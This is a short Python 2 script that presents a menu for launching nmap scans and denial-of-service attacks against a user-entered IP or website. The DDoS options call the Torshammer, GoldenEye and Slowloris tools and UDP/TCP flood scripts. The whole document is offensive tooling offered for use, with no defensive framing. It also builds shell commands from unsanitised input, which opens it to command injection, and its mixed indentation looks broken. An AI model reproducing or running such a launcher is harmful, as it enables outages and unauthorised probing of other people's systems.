
import subprocess
import socket

def cal(cmd):
	subprocess.call(cmd, shell=True)
cal("clear")
print ("USE NUMBER KEY TO SELECT OPTION")
print ("")
print ("1 = NMAP")
print ("2 = DDOS")
print ("")
choice = raw_input("[root@main]#")

if choice == '1':
	print ("QUICK SCAN = 1")
	print ("INTENSE SCAN = 2")
	print ("QUICK SCAN + UDP = 3")
	print ("SCAN ALL TCP PORTS = 4")

	choice = raw_input("[root@nmap]#")
       	if choice == '1':
	 ip = raw_input("Enter IP You Want To Scan: ")
	 ot = raw_input("Enter OutPut File: ")
	 cal("nmap -A "+ ip +" -o "+ ot +"")

	if choice == '2':
	 ip = raw_input("Enter IP You Want to Scan: ")
	 ot = raw_input("Enter Output File Name: ")
	 cal("nmap -T4 -A -v "+ ip +" && nmap -T4 -A -v "+ ip +" -o "+ ot +"")

	if choice == '3':
	 ip = raw_input("Enter IP You Want to Scan: ")
	 ot = raw_input("Enter Output File Name: ")
	 cal("nmap -sU -A -T4 "+ ip +" -o "+ ot +"")

	if choice == '4':
	 ip = raw_input("Enter IP You Want to Scan: ")
	 ot = raw_input("Enter Output File Name: ")
	 cal("nmap -p 1-65535 -T4 -A "+ ip +" -o "+ ot +"")

if choice == '2':
  	print ("")
	print ("Torshammer = 1")
  	print ("GoldenEye = 2")
 	print ("Slowloris = 3")
	print ("UDP = 4")
	print ("TCP = 5")
	print ("")
	choice = raw_input("[root@ddos]#")
 	if choice == '1':
		ip = raw_input("Enter IP/Website: ")
		pt = raw_input("Enter Port: ")

		cal("cd files/torshammer && python torshammer.py -t "+ ip +" -p "+ pt +"")

 	if choice == '2':
		ip = raw_input("Enter Website URL: ")
		cal("cd files/GoldenEye && python goldeneye.py "+ ip +"")

	if choice == '3':
		ip = raw_input("Enter Domain: ")
		cal("cd files/slowloris && python slowloris.py "+ ip +"")
	if choice == '4':
		ip = raw_input("Enter IP Address: ")
		pt = raw_input("Enter Port: ")
		sz = raw_input("Enter Packet Size: ")
		te = raw_input("Enter Time: ")
		cal("cd files/udp && perl udp.pl "+ ip +" "+ pt +" "+ sz +" "+ te +" ")
	if choice == '5':
		ip = raw_input("Enter Domain: ")
		pt = raw_input("Enter Port: ")
		cal("cd files/udp && python tcp.py "+ ip +" -p "+ pt +"")
exit
			       
